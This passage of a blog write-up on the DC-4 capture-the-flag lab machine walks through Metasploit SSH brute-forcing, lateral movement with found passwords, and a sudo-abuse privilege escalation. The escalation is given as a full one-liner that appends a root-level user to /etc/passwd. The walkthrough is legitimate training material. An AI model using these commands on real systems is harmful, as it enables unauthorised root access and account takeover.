ssh_login</figcaption></figure></p><p><code>scanner/ssh/ssh_login</code> prompt should be active now and we can start editing the auxiliary module&rsquo;s options.</p><p>To see the current options, run <code>options</code>. To set the needed options, run the following:</p><ol><li><code>set USER_FILE &lt;users.txt></code> - username file we created earlier</li><li><code>set PASS_FILE &lt;pw.txt></code> - password file we extracted earlier</li><li><code>set RHOST 192.168.0.151</code> - remote host we&rsquo;re attacking.. DC-4&rsquo;s IP</li><li><code>set VERBOSE True</code> - enables feedback on failed and successful login attempts</li><li><code>options</code> - review what is set and compare to below</li></ol><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/msfconsole-options-set.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/msfconsole-options-set.png?size=small" data-sub-html="<h2>msfconsole - options set and ready</h2><p>msfconsole - options set and ready</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/msfconsole-options-set.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/msfconsole-options-set.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/msfconsole-options-set.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/msfconsole-options-set.png?size=large 2x" sizes=auto data-title="msfconsole - options set and ready" data-alt="msfconsole - options set and ready" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>msfconsole - options set and ready</figcaption></figure></p><p>With the <code>ssh_login</code> module ready, enter <code>run</code> into the terminal and watch it slowly automate our ssh logins!</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/msfconsole-ssh-success.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/msfconsole-ssh-success.png?size=small" data-sub-html="<h2>msfconsole - ssh login success</h2><p>msfconsole - ssh login success</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/msfconsole-ssh-success.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/msfconsole-ssh-success.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/msfconsole-ssh-success.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/msfconsole-ssh-success.png?size=large 2x" sizes=auto data-title="msfconsole - ssh login success" data-alt="msfconsole - ssh login success" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>msfconsole - ssh login success</figcaption></figure></p><p>We land a successful login with the following credentials:<br><strong>jim:jibril04</strong></p><br><p><strong>Hacker mindset</strong><br>Simple. We check if our new found SSH creds authenticate to DC-4 through the open SSH service on port 22. Also, don&rsquo;t forget to check if we can access that mbox file which www-data didn&rsquo;t have privs to.</p><hr><hr><h2 id=accessing-dc-4-as-jim>Accessing DC-4 as &ldquo;jim&rdquo;</h2><p>Open a new terminal and login as &ldquo;jim&rdquo;, using the credentials we just found.<br><strong>jim:jibril04</strong></p><p>Congrats! You just made a lateral move on DC-4 and this may open new attack paths. Let&rsquo;s go explore what jim has access to!</p><p>First thing I check for is <code>history</code> as it will print jim&rsquo;s history list.<br>It&rsquo;s always worth checking but this time round no results.</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/jim-history.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/jim-history.png?size=small" data-sub-html="<h2>jim - history</h2><p>jim - history</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/jim-history.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/jim-history.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/jim-history.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/jim-history.png?size=large 2x" sizes=auto data-title="jim - history" data-alt="jim - history" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>jim - history</figcaption></figure></p><p>Next is checking jim&rsquo;s sudo privs by running <code>sudo -l</code>.<br>Looks like jim is NOT a part of the sudoers group, so no potential easy sudo exploits.</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/jim-sudoers.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/jim-sudoers.png?size=small" data-sub-html="<h2>jim - not a part of sudoers group</h2><p>jim - not a part of sudoers group</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/jim-sudoers.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/jim-sudoers.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/jim-sudoers.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/jim-sudoers.png?size=large 2x" sizes=auto data-title="jim - not a part of sudoers group" data-alt="jim - not a part of sudoers group" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>jim - not a part of sudoers group</figcaption></figure></p><p>Remember the mbox file? Let&rsquo;s try to cat out its content!<br>Nothing useful found but this makes me wonder if there&rsquo;s any mbox files within the webservers var directory.</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/jim-mbox.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/jim-mbox.png?size=small" data-sub-html="<h2>jim - cat mbox file</h2><p>jim - cat mbox file</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/jim-mbox.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/jim-mbox.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/jim-mbox.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/jim-mbox.png?size=large 2x" sizes=auto data-title="jim - cat mbox file" data-alt="jim - cat mbox file" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>jim - cat mbox file</figcaption></figure></p><p>Navigate to the <code>/var/mail/</code> directory and <code>ls -lsaht</code> its contents.<br>To break down the <code>ls -lsaht</code> options for you&mldr;</p><ul><li><code>l</code> - use long listing format</li><li><code>s</code> - prints the allocated size of each file</li><li><code>a</code> - lists all files</li><li><code>h</code> - enables human readable data sizes</li><li><code>t</code> - sorts by modification time</li></ul><p>Looks like we have read/write permissions to a file named &ldquo;jim&rdquo;. As it&rsquo;s located in the /var/mail/ directory, lets see if it holds anything useful for our attack!</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/jim-jim-mail-contents.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/jim-jim-mail-contents.png?size=small" data-sub-html="<h2>jim - cat jim file</h2><p>jim - cat jim file</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/jim-jim-mail-contents.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/jim-jim-mail-contents.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/jim-jim-mail-contents.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/jim-jim-mail-contents.png?size=large 2x" sizes=auto data-title="jim - cat jim file" data-alt="jim - cat jim file" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>jim - cat jim file</figcaption></figure></p><p>Bingo! The contents of this email possesses a password from the user charles!</p><p><strong>^xHhA&amp;hvim0y</strong></p><br><p><strong>Hacker mindset</strong><br>In a real engagement, you&rsquo;d want to run any found passwords against all users to test for poor password management.<br>As this is a simple CTF, I&rsquo;ll check if it allows me to login as charles. Charles seems to have higher privs than jim, so maybe it&rsquo;ll allow me to dig deeper into DC-4.</p><hr><hr><h2 id=rooting-dc-4>Rooting DC-4</h2><p>Let&rsquo;s see if charles provides us more privs over DC-4! Maybe it&rsquo;ll provide us an opportunity to root DC-4.</p><h3 id=access-as-charles>Access as charles</h3><p>Since we already have a SSH session established, we can attempt to access charles by using the <code>su</code> command. <code>su</code> allows the current session to become another user.<br>To switch to charles, we&rsquo;d run <code>su charles</code>. If you left <code>charles</code> out of the command and ran <code>su</code> alone, it would default to superuser(root).<br>So run, <code>su charles</code> and plugin the password found in the &ldquo;jim&rdquo; mbox file.<br>Yet another lateral move on DC-4!</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/charles-access.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/charles-access.png?size=small" data-sub-html="<h2>charles - access to DC-4</h2><p>charles - access to DC-4</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/charles-access.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/charles-access.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/charles-access.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/charles-access.png?size=large 2x" sizes=auto data-title="charles - access to DC-4" data-alt="charles - access to DC-4" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>charles - access to DC-4</figcaption></figure></p><h3 id=abusing-charles-privileges>Abusing charle&rsquo;s privileges</h3><p>First thing first, run <code>sudo -l</code> to list out any sudo privs charles may have on DC-4.<br>We have authorization to run the binary <code>/usr/bin/teehee</code> with root privs. Funny as it seems the DC-4 creator renamed or created a new binary based on the original binary named <code>tee</code>.</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/charles-sudo-privs.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/charles-sudo-privs.png?size=small" data-sub-html="<h2>charles - root privs running teehee</h2><p>charles - root privs running teehee</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/charles-sudo-privs.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/charles-sudo-privs.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/charles-sudo-privs.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/charles-sudo-privs.png?size=large 2x" sizes=auto data-title="charles - root privs running teehee" data-alt="charles - root privs running teehee" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>charles - root privs running teehee</figcaption></figure></p><p><code>tee</code> is a binary used in many operating systems and takes standard input and writes to both standard output and file(s). The name comes from its operation scheme.</p><p>Reassessing the situation, sudo is configured to allow charles run permissions on binary <code>/usr/bin/teehee</code> with root privilege.<br>A simple and effective privilege escalation attack would be to abuse this sudo configuration and use <code>teehee</code> to append a new user into the <code>/etc/passwd</code> file, granting us root privileges on DC-4.</p><h3 id=appending-new-user-into-etcpasswd>Appending new user into /etc/passwd</h3><p>Let&rsquo;s check if <code>openssl</code> is present on DC-4 by running <code>which openssl</code>.<br>Yep, it is!</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/charles-which-openssl.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/charles-which-openssl.png?size=small" data-sub-html="<h2>charles - which openssl</h2><p>charles - which openssl</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/charles-which-openssl.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/charles-which-openssl.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/charles-which-openssl.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/charles-which-openssl.png?size=large 2x" sizes=auto data-title="charles - which openssl" data-alt="charles - which openssl" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>charles - which openssl</figcaption></figure></p><p>Next we want to create a hashed password with <code>openssl</code>.<br><code>/etc/passwd</code> requires it to be a MD5 format with the salt being the username.</p><p>Edit the following command, run it on your attackbox or DC-4, and then copy the output to clipboard:<br><code>openssl passwd -1 -salt "&lt;username>" "&lt;password>"</code></p><ul><li><code>passwd</code> - tells openssl to compute the hash of a password</li><li><code>-1</code> - uses MD5 algorithm</li><li><code>-salt "imroot"</code> - salts the password with the value &ldquo;imroot&rdquo;, which is the username I&rsquo;ve chosen</li><li><code>revsh3ll</code> - the password chosen for the user &ldquo;imroot&rdquo;, which I&rsquo;ll append to /etc/passwd</li></ul><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/charles-openssl-output.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/charles-openssl-output.png?size=small" data-sub-html="<h2>charles - openssl output</h2><p>charles - openssl output</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/charles-openssl-output.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/charles-openssl-output.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/charles-openssl-output.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/charles-openssl-output.png?size=large 2x" sizes=auto data-title="charles - openssl output" data-alt="charles - openssl output" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>charles - openssl output</figcaption></figure></p><p>Now with a salted MD5 password, we can append it to the <code>/etc/passwd</code> file in linux using the <code>tee</code> binary.
Normally when adding a new user to a linux system, non-system UserIDs start at 1000 and this would normally be done by running <code>adduser &lt;username></code>.<br>Since we have root privs to <code>tee</code>, we&rsquo;ll be adding a user with a UserID of 0(zero). This will allow us to gain root privs on DC-4.</p><h3 id=pwn-dc-4>Pwn DC-4</h3><p>Here&rsquo;s a one-liner using the following creds: <u>imroot:revsh3ll</u></p><p><code>echo 'imroot:$1$imroot$1dH55UU8nz7m..Li4V7Zj0:0:0:root:/root:/bin/bash' | sudo /usr/bin/teehee -a /etc/passwd</code></p><ul><li><p><code>echo</code> - echo the string to be appended to <code>/etc/passwd</code></p></li><li><p><code>'imroot:$1$imroot$1dH55UU8nz7m..Li4V7Zj0:0:0:root:/root:/bin/bash'</code> - string to be appended<br>format = username:saltedMD5password:UserID:GroupID:homedirectory:shell</p></li><li><p><code>|</code> - pipes the echo command into <code>/usr/bin/teehee</code> binary</p></li><li><p><code>sudo /usr/bin/teehee -a /etc/passwd</code> - takes in standard input of our echo&rsquo;d value and runs <code>teehee</code>, with root privs, and appends(<code>-a</code>) it to <code>/etc/passwd</code></p></li></ul><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/root-dc-4.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/root-dc-4.png?size=small" data-sub-html="<h2>DC-4 - ROOTED!!</h2><p>DC-4 - ROOTED!!</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/root-dc-4.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/root-dc-4.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/root-dc-4.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/root-dc-4.png?size=large 2x" sizes=auto data-title="DC-4 - ROOTED!!" data-alt="DC-4 - ROOTED!!" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>DC-4 - ROOTED!!</figcaption></figure></p><p>Below I included a screenshot of the /etc/passwd contents, after appending the user &ldquo;imroot&rdquo;.</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/etc-passwd-results.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/etc-passwd-results.png?size=small" data-sub-html="<h2>DC-4 - /etc/passwd</h2><p>DC-4 - /etc/passwd</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/etc-passwd-results.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/etc-passwd-results.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/etc-passwd-results.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/etc-passwd-results.png?size=large 2x" sizes=auto data-title="DC-4 - /etc/passwd" data-alt="DC-4 - /etc/passwd" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>DC-4 - /etc/passwd</figcaption></figure></p><hr><hr><h2 id=quick-summary>Quick Summary</h2><p>DC-4 provided a look into how an adversary could compromise a web server due to misconfigurations and poor password management.</p><p><strong>Step 1</strong> - Lack of a authentication lockout policy, along with poor password management, allowed the attacker unrestricted brute-force attempts against an exposed devops login panel. With time and little effort, the attacker successfully logged in as an administrator, allowing access to a &ldquo;command.php&rdquo; tool.</p><p><strong>Step 2</strong> - With no user input validation, sanitization, and poor coding via the use of the PHP &ldquo;shell_exec&rdquo; function, command.php provided the attacker with unrestricted code injection. With this vulnerability, a reverse shell was established as a low-level user &ldquo;www-data&rdquo;, providing the attacker direct access with the linux operating system.</p><p><strong>Step 3</strong> - Within only a few minutes, the attacker found unsecure credentials in the home folder of the user &ldquo;jim&rdquo;. With read privileges, as the user www-data, the attacker extracted a list of clear text passwords. With no key-based authentication or MFA required, the attacker moved laterally through SSH, to a user named jim, by automating SSH logins using the found list of clear text passwords.</p><p><strong>Step 4</strong> - With access as the user jim, the attacker found an unencrypted email containing the password of the user charles. After laterally moving to the user charles, the attacker found the final path to compromising the system by abusing sudo.</p><p><strong>Step 5</strong> - As the user charles, the attacker found the binary &ldquo;tee&rdquo; to be executable as root, through sudo, which allowed the attacker to gain root privileges on DC-4. This privilege escalation attack works by appending a new root user onto the /etc/passwd file, ultimately giving the attacker full control of DC-4.</p><p>Onto DC-5. Bring me a challenge!</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span title="Updated on 2024-02-14 13:00:00">Updated on 02-14-2024&nbsp;</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Twitter" data-sharer=twitter data-url=https://PivotTheNet.GitHub.io/dc-4/ data-title="DC-4 of the DC Series" data-hashtags="CTF (self-hosted),Fuzzing,ZAP,wfuzz,Brute-force,Sudo abuse,nmap,Metasploit,Enumeration"><i class="fa-brands fa-twitter fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); title="Share on Facebook" data-sharer=facebook data-url=https://PivotTheNet.GitHub.io/dc-4/ data-hashtag="CTF (self-hosted)"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); title="Share on Reddit" data-sharer=reddit data-url=https://PivotTheNet.GitHub.io/dc-4/><i class="fa-brands fa-reddit fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); title="Share on Evernote" data-sharer=evernote data-url=https://PivotTheNet.GitHub.io/dc-4/ data-title="DC-4 of the DC Series"><i class="fa-brands fa-evernote fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fa-solid fa-tags fa-fw me-1" aria-hidden=true></i><a href=/tags/ctf-self-hosted/ class=post-tag>CTF (self-hosted)</a><a href=/tags/fuzzing/ class=post-tag>Fuzzing</a><a href=/tags/zap/ class=post-tag>ZAP</a><a href=/tags/wfuzz/ class=post-tag>wfuzz</a><a href=/tags/brute-force/ class=post-tag>Brute-force</a><a href=/tags/sudo-abuse/ class=post-tag>Sudo abuse</a><a href=/tags/nmap/ class=post-tag>nmap</a><a href=/tags/metasploit/ class=post-tag>Metasploit</a><a href=/tags/enumeration/ class=post-tag>Enumeration</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/post-exploitation/ class=post-nav-item rel=prev title="Post Exploitation Resources"><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i>Post Exploitation Resources</a></div></div></article></main><footer class=footer><div class=footer-container><div class="footer-line copyright order-5" itemscope itemtype=http://schema.org/CreativeWork><i class="fa-regular fa-copyright fa-fw" aria-hidden=true></i>
<span itemprop=copyrightYear>2022 - 2024</span><span class=author itemprop=copyrightHolder>
<a href=/>revsh3ll</a></span><span class="license footer-divider">Content = <a rel="license external nofollow noopener noreferrer" href=https://creativecommons.org/licenses/by-sa/4.0/deed.en target=_blank>CC BY-SA 4.0</a> | Coding = <a rel="license external nofollow noopener noreferrer" href=https://www.gnu.org/licenses/gpl-3.0.en.html target=_blank>GPLv3</a><br>Disclaimer: The knowledge and interests shared are for educational and informational purposes only!</span></div><div class="footer-line statistics order-2"><span class=site-time title='Website running ...'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden=true></i><span class="run-times ms-1">Website running ...</span></span></div></div></footer></div><div class=widgets><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role=button aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden=true></i><span class="variant-numeric d-none">0%</span></div></div><a href=https://github.com/PivotTheNet title="View my GitHub!" target=_blank rel="external nofollow" class="github-corner right d-none-mobile"><svg viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg></a><div id=mask></div><div class=reading-progress-bar style=left:0;top:0></div><noscript><div class=noscript-warning>Theme FixIt works best with JavaScript enabled.</div></noscript></div><link rel=stylesheet href=/lib/pace/themes/blue/pace-theme-minimal.css><script src=/lib/autocomplete/autocomplete.min.js defer></script><script src=/lib/lunr/lunr.min.js defer></script><script src=/lib/twemoji/twemoji.min.js defer></script><script src=/lib/sharer/sharer.min.js async defer></script><script src=/lib/typeit/index.umd.js defer></script><script src=/lib/pace/pace.min.js async defer></script><script>window.config={autoBookmark:!0,code:{copyTitle:"Copy to clipboard",editLockTitle:"Lock editable code block",editUnLockTitle:"Unlock editable code block",editable:!0,maxShownLines:10},comment:{enable:!1},data:{"typeit-header-desktop":"./PivotTheNet","typeit-header-title-mobile":"./PivotTheNet"},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"},siteTime:"2022-07-23T12:00+07:00",twemoji:!0,typeit:{cursorChar:"_",cursorSpeed:1e3,data:{"typeit-header-desktop":["typeit-header-desktop"],"typeit-header-title-mobile":["typeit-header-title-mobile"]},duration:-1,loop:!1,speed:350}}</script><script src=/js/theme.min.js defer></script></body></html>